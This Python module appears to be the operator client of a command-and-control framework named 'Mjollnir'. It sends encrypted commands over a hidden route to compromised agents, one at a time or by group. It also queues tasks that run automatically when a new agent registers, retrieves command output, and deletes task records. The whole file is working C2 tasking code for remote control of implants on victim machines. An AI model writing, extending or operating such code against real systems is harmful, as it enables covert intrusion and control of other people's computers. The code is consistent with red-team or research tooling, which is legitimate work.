
import json
import misc
import termtables as tt

class Task():
	def __init__(self, config, session, misc):
		self.config = config
		self.s = session
		self.misc = misc

	def create_task(self, agent_uid, cmd_request, cmd_arg):
		# POST mjollir_url/hidden_route/task/agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["task"] + "/" + agent_uid
		data = {}
		data["cmd_request"] = cmd_request
		data["cmd_arg"] = cmd_arg

		data = json.dumps(data)
		#print(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			#print(self.misc.decrypt(r.content))
			return self.misc.decrypt(r.content)
		else:
			print("[-] Cannot create the task for the agent: " + agent_uid)
			return self.misc.decrypt(r.content)

	def create_group_task(self, group_name, cmd_request, cmd_arg):
		# find all agents uids that has group_name

		# GET mjollnir/hidden_route/agents
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["agents"]
		r = self.s.get(url+endpoint)
		agent_uids = []
		if r.status_code == 200:
			try:
				j = json.loads(self.misc.decrypt(r.content))
				#print(j)
				for k in j.keys():
					#print(j[k]) # [uid, name, group, type, os, created at, last check, ip, hostname, usermane, integrity level, version]
					if j[k][2] == group_name:
						agent_uids.append(j[k][0])
			except Exception as e:
				print(str(e))
				print(self.misc.decrypt(r.content))	
		else:
			print("[-] Cannot list the agents")
			return False

		# create the task for each agent_uid
		for agent_uid in agent_uids:
			task_uid = self.create_task(agent_uid, cmd_request, cmd_arg)
			print("[+] Task created: " + task_uid)

		return True

	def list_agent_task(self, agent_uid):
		# GET mjollir_url/hidden_route/task?agent_uid=agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["task"] + "?agent_uid=" + agent_uid

		r = self.s.get(url+endpoint)
		if r.status_code == 200:
			#print(self.misc.decrypt(r.content))
			return self.misc.decrypt(r.content)
		else:
			print("[-] Cannot list the tasks for the agent: " + agent_uid)
			return self.misc.decrypt(r.content)


	def get_result(self, agent_uid, task_uid):
		# GET mjollir_url/hidden_route/task/task_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["task"]
		
		r = self.s.get(url+endpoint + "/" + task_uid)
		if r.status_code == 200:
			j = self.misc.decrypt(r.content)
			j = json.loads(j)
			if j[task_uid][0]:
				cmd_result = j[task_uid][1] 
				cmd_request = j[task_uid][2] 
				cmd_arg = j[task_uid][3]
				print()
				if agent_uid != "":
					print("[+] Result for the task: " + task_uid + " from the agent: " + agent_uid)
				else:
					print("[+] Result for the task: " + task_uid)
				
				print("[*] " + cmd_request + " " + cmd_arg)
				print()
				print(cmd_result)
			else:
				return False
		else:
			return False
		
		return True

	def delete_all_tasks_for_agent(self, agents_uid):
		# DELETE mjollir_url/hidden_route/task/agent_uid
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["task"]
		for agent_uid in agents_uid:
			data = self.misc.encrypt(agent_uid)
			r = self.s.delete(url+endpoint, data=data)
			if r.status_code == 200:
				print(self.misc.decrypt(r.content))
			else:
				print("[-] Cannot delete all task for agent: " + agent_uid)
				
		return True

class OnRegisteringTask():
	def __init__(self, config, session, misc):
		self.config = config
		self.s = session
		self.misc = misc

	def create_registering_task(self, agent_name, cmd_request, cmd_arg):
		# POST mjollir_url/hidden_route/registering_task/agent_name
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["registering_task"] + "/" + agent_name
		data = {}
		data["cmd_request"] = cmd_request
		data["cmd_arg"] = cmd_arg

		data = json.dumps(data)
		#print(data)

		data = self.misc.encrypt(data)
		r = self.s.post(url+endpoint, data=data)
		if r.status_code == 200:
			#print(self.misc.decrypt(r.content))
			return self.misc.decrypt(r.content)
		else:
			print("[-] Cannot create the 'on registering task' for the agent name: " + agent_name)
			return self.misc.decrypt(r.content)

	def list_registering_tasks_for_agent(self, agent_name):
		# GET mjollir_url/hidden_route/registering_task?agent_name=agent_name
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["registering_task"] + "?agent_name=" + agent_name

		r = self.s.get(url+endpoint)
		if r.status_code == 200:
			#print(self.misc.decrypt(r.content))
			return self.misc.decrypt(r.content)
		else:
			print("[-] Cannot list the 'on registering tasks' for the agent: " + agent_name)
			return self.misc.decrypt(r.content)

	def delete_registering_task(self, tasks_uid):
		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
		endpoint = self.config["endpoints"]["registering_task"]
		for task_uid in tasks_uid:
			data = self.misc.encrypt(task_uid)
			r = self.s.delete(url+endpoint + "?task_uid=" + task_uid, data=data)
			if r.status_code == 200:
				print(self.misc.decrypt(r.content))
			else:
				print("[-] Cannot delete the 'on registering task': " + task_uid)
		return True
